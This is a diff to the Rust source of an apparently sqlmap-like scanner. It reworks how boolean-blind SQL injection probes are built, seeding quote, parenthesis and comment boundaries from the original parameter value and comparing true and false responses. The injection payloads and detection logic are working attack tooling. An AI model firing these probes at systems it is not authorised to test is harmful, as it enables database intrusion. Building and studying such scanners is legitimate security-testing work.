@@ -22,51 +22,72 @@ pub struct BlindVector {
     pub delay: u64,           // Delay in seconds for time-based
 }
 
-/// A boolean-blind boundary to probe: (prefix, suffix, true_code, false_code,
-/// true_payload, false_payload). Table-driven so the full boundary matrix (paren,
-/// comment and quote variants) can be expanded here without touching the logic.
+/// How a boundary terminates the injected condition.
+enum BoolTerm {
+    /// Terminate with a SQL comment (e.g. "-- -", "#").
+    Comment(&'static str),
+    /// Close with a paired-quote condition (no comment), using this quote char.
+    Paired(char),
+}
+
+/// A boolean-blind boundary *shape*: what to append to the original value to
+/// break out of its context (`closer`) and how to terminate (`term`). Payloads
+/// are built per-target by seeding the real parameter value, so string contexts
+/// like `WHERE name='admin'` keep matching the original row.
 struct BoolBoundary {
-    prefix: &'static str,
-    suffix: &'static str,
-    true_code: &'static str,
-    false_code: &'static str,
-    true_payload: &'static str,
-    false_payload: &'static str,
+    closer: &'static str,
+    term: BoolTerm,
 }
 
 // Boundary matrix modelled on sqlmap's boundaries: numeric, single-quote,
-// double-quote and parenthesised contexts, each terminated by a comment so the
-// trailing application syntax is neutralised (these are extraction-safe). The
-// paired-quote variants (no comment) are kept last as detection-only fallbacks.
+// double-quote and parenthesised contexts, comment-terminated (extraction-safe)
+// plus paired-quote fallbacks for when comments are stripped. Each is seeded
+// from the original parameter value at scan time.
 const BOOL_BOUNDARIES: &[BoolBoundary] = &[
-    // Numeric context
-    BoolBoundary { prefix: "1", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
-        true_payload: "1 AND 1=1-- -", false_payload: "1 AND 1=2-- -" },
-    BoolBoundary { prefix: "1", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
-        true_payload: "1 AND 1=1#", false_payload: "1 AND 1=2#" },
-    // Single-quote string context
-    BoolBoundary { prefix: "1'", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
-        true_payload: "1' AND 1=1-- -", false_payload: "1' AND 1=2-- -" },
-    BoolBoundary { prefix: "1'", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
-        true_payload: "1' AND 1=1#", false_payload: "1' AND 1=2#" },
-    // Double-quote string context
-    BoolBoundary { prefix: "1\"", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
-        true_payload: "1\" AND 1=1-- -", false_payload: "1\" AND 1=2-- -" },
-    // Parenthesised numeric context
-    BoolBoundary { prefix: "1)", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
-        true_payload: "1) AND (1=1)-- -", false_payload: "1) AND (1=2)-- -" },
-    // Parenthesised single-quote context
-    BoolBoundary { prefix: "1')", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
-        true_payload: "1') AND (1=1)-- -", false_payload: "1') AND (1=2)-- -" },
-    // Double-parenthesised single-quote context
-    BoolBoundary { prefix: "1'))", suffix: "-- -", true_code: "AND ((1=1))", false_code: "AND ((1=2))",
-        true_payload: "1')) AND ((1=1))-- -", false_payload: "1')) AND ((1=2))-- -" },
-    // Paired-quote fallbacks (detection-only; no comment terminator)
-    BoolBoundary { prefix: "1'", suffix: "", true_code: "AND '1'='1", false_code: "AND '1'='2",
-        true_payload: "1' AND '1'='1", false_payload: "1' AND '1'='2" },
-    BoolBoundary { prefix: "1\"", suffix: "", true_code: "AND \"1\"=\"1", false_code: "AND \"1\"=\"2",
-        true_payload: "1\" AND \"1\"=\"1", false_payload: "1\" AND \"1\"=\"2" },
+    BoolBoundary { closer: "",    term: BoolTerm::Comment("-- -") }, // numeric
+    BoolBoundary { closer: "",    term: BoolTerm::Comment("#") },
+    BoolBoundary { closer: "'",   term: BoolTerm::Comment("-- -") }, // single-quote string
+    BoolBoundary { closer: "'",   term: BoolTerm::Comment("#") },
+    BoolBoundary { closer: "\"",  term: BoolTerm::Comment("-- -") }, // double-quote string
+    BoolBoundary { closer: ")",   term: BoolTerm::Comment("-- -") }, // paren numeric
+    BoolBoundary { closer: "')",  term: BoolTerm::Comment("-- -") }, // paren single-quote
+    BoolBoundary { closer: "'))", term: BoolTerm::Comment("-- -") }, // double-paren
+    BoolBoundary { closer: "\")", term: BoolTerm::Comment("-- -") },
+    BoolBoundary { closer: "'",   term: BoolTerm::Paired('\'') },    // comment-strip fallbacks
+    BoolBoundary { closer: "\"",  term: BoolTerm::Paired('"') },
 ];
+
+/// Built payloads for one boundary, seeded from the original value.
+struct BoolPayloads {
+    prefix: String,
+    suffix: String,
+    true_code: String,
+    false_code: String,
+    true_payload: String,
+    false_payload: String,
+}
+
+fn build_bool_payloads(base: &str, b: &BoolBoundary) -> BoolPayloads {
+    let prefix = format!("{base}{}", b.closer);
+    match b.term {
+        BoolTerm::Comment(c) => BoolPayloads {
+            true_payload: format!("{prefix} AND 1=1{c}"),
+            false_payload: format!("{prefix} AND 1=2{c}"),
+            suffix: c.to_string(),
+            true_code: "AND 1=1".to_string(),
+            false_code: "AND 1=2".to_string(),
+            prefix,
+        },
+        BoolTerm::Paired(q) => BoolPayloads {
+            true_payload: format!("{prefix} AND {q}1{q}={q}1"),
+            false_payload: format!("{prefix} AND {q}1{q}={q}2"),
+            suffix: String::new(),
+            true_code: format!("AND {q}1{q}={q}1"),
+            false_code: format!("AND {q}1{q}={q}2"),
+            prefix,
+        },
+    }
+}
 
 /// Check if target is vulnerable to boolean-based blind SQLi.
 ///
@@ -77,11 +98,19 @@ const BOOL_BOUNDARIES: &[BoolBoundary] = &[
 ///    similarity ratios, not just absolute thresholds, which holds up on pages
 ///    with naturally varying content.
 pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
-    let baseline = remove_dynamic_content(&request.query_page("1").await?);
+    // Seed boundaries from the real parameter value so the TRUE condition keeps
+    // matching the original row in string contexts (e.g. WHERE name='admin').
+    let base = request.original_value();
+    let base = if base.trim().is_empty() { "1".to_string() } else { base };
+
+    // Baseline is the response for the original value itself, so a TRUE payload
+    // (original + AND true) should resemble it and a FALSE payload should not.
+    let baseline = remove_dynamic_content(&request.query_page(&base).await?);
 
     for boundary in BOOL_BOUNDARIES {
-        let true_page = remove_dynamic_content(&request.query_page(boundary.true_payload).await?);
-        let false_page = remove_dynamic_content(&request.query_page(boundary.false_payload).await?);
+        let pl = build_bool_payloads(&base, boundary);
+        let true_page = remove_dynamic_content(&request.query_page(&pl.true_payload).await?);
+        let false_page = remove_dynamic_content(&request.query_page(&pl.false_payload).await?);
         let true_ratio = page_ratio(&true_page, &baseline);
         let false_ratio = page_ratio(&false_page, &baseline);
 
@@ -94,10 +123,10 @@ pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVe
         {
             return Ok(Some(BlindVector {
                 dbms: DBMS::Unknown,
-                prefix: boundary.prefix.to_string(),
-                suffix: boundary.suffix.to_string(),
-                true_code: boundary.true_code.to_string(),
-                false_code: boundary.false_code.to_string(),
+                prefix: pl.prefix,
+                suffix: pl.suffix,
+                true_code: pl.true_code,
+                false_code: pl.false_code,
                 time_based: false,
                 delay: 0,
             }));
